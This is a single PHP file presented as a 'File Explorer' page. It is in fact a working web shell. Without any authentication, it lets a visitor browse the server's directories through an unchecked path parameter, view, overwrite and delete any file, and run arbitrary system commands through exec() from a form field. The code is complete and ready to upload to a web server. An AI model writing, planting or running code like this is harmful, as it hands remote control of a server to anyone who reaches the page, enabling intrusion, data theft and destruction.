<?php
// Get the current file or directory path
$currentPath = isset($_GET['path']) ? $_GET['path'] : null;

// File actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['edit']) && is_file($currentPath)) {
        // Edit file
        $editedContent = $_POST['edited_content'];
        file_put_contents($currentPath, $editedContent);
        header("Location: ?path=" . urlencode($currentPath));
        exit();
    } elseif (isset($_POST['delete']) && is_file($currentPath)) {
        // Delete file
        unlink($currentPath);
        header("Location: ?");
        exit();
    } elseif (isset($_POST['execute_command'])) {
        // Execute arbitrary command
        $command = $_POST['command'];
        $output = null;
        $return_var = null;
        exec($command, $output, $return_var);

        echo "<h2>Command Execution Result</h2>";
        echo "<pre>";
        echo "Command: " . htmlspecialchars($command) . "\n";
        echo "Output:\n" . htmlspecialchars(implode("\n", $output)) . "\n";
        echo "Return Code: " . htmlspecialchars($return_var) . "\n";
        echo "</pre>";
    }
}

// Display file contents or list directory contents based on the type
if ($currentPath) {
    if (is_file($currentPath)) {
        echo "<h2>File Contents: $currentPath</h2>";
        echo "<pre>";
        echo htmlentities(file_get_contents($currentPath));
        echo "</pre>";

        // Edit form
        echo "<h2>Edit File</h2>";
        echo "<form method='post'>";
        echo "<textarea name='edited_content' rows='10' cols='80'>" . htmlspecialchars(file_get_contents($currentPath)) . "</textarea><br>";
        echo "<button type='submit' name='edit'>Save Changes</button>";
        echo "</form>";

        // Delete form
        echo "<h2>Delete File</h2>";
        echo "<form method='post'>";
        echo "<button type='submit' name='delete'>Delete File</button>";
        echo "</form>";
    } elseif (is_dir($currentPath)) {
        echo "<h2>Directory Listing: $currentPath</h2>";
        echo "<ul>";

        // List files and directories in the current directory
        $items = scandir($currentPath);
        foreach ($items as $item) {
            // Exclude current and parent directory entries
            if ($item != '.' && $item != '..') {
                $itemPath = $currentPath . '/' . $item;
                echo "<li><a href='?path=" . urlencode($itemPath) . "'>$item</a></li>";
            }
        }

        echo "</ul>";
    } else {
        echo "<h2>Invalid path or not found.</h2>";
    }
} else {
    echo "<h2>No path selected.</h2>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Explorer</title>
</head>
<body>
    <h1>File Explorer</h1>

    <ul>
        <?php
        // List files and directories in the current directory
        $items = scandir('.');
        foreach ($items as $item) {
            // Exclude current and parent directory entries
            if ($item != '.' && $item != '..') {
                $itemPath = './' . $item;
                echo "<li><a href='?path=" . urlencode($itemPath) . "'>$item</a></li>";
            }
        }
        ?>
    </ul>

    <h2>Execute Custom Command</h2>
    <form method="post">
        <label for="command">Command:</label>
        <input type="text" name="command" id="command" autocomplete="off">
        <button type="submit" name="execute_command">Execute Command</button>
    </form>
</body>
</html>
